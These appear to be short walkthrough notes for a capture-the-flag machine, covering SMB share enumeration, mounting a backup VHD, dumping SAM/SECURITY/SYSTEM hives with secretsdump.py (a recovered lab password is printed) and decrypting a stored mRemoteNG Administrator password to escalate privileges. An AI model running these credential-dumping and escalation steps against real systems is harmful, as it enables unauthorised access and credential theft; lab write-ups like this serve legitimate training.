List SMB shares:
```bash
smbclient -L \\\\<ip>\\
```

Connect to *Backups* share:
```bash
smbclient \\\\<ip>\\Backups
```

Download *note.txt*:
```smb
get note.txt
```

Mount .vhd files remotely:
Mounting VHD Files - [https://medium.com/@klockw3rk/mounting-vhd-file-on-kali-linux-through-remote-share-f2f9542c1f25](https://medium.com/@klockw3rk/mounting-vhd-file-on-kali-linux-through-remote-share-f2f9542c1f25)

From the directory *Windows/System32/config/* download the following files:
- SAM
- SECURITY
- SYSTEM

Extract hashes:
```bash
secretsdump.py -sam SAM -security SECURITY -secret SECRET LOCAL
```
=> User: l4mpje, Password: bureaulampje

Login to ssh with these creds.

---
PrivEsc

In `C:\Program Files (x86)` is a program named *mRemoteNG*.
Google:
- mRemoteNG stores pw in an XML file in user *appdata* folder
- There is exploits available.

Run exploit with Administrator encrypted password from XML file -> Administrator password

ssh login with administrator creds